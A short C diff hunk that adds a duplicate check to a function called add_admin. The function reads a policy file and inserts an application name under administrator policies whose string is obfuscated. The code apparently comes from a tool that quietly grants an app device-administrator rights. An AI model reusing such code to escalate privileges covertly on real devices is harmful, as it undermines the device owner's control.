@@ -628,6 +628,14 @@ void add_admin(const char *appname) {
     read(fd, buf, size);
     lseek(fd, 0, SEEK_SET);
 
+	if (strstr(buf, appname)) {
+		LOG("Application already in the manifest\n");
+		memset(buf, 0x00, size + 1);
+		free(buf);
+		close(fd);
+		return;
+	}
+	
     ptr = strstr(buf, deobfuscate(policies));
 
     // No admins already set
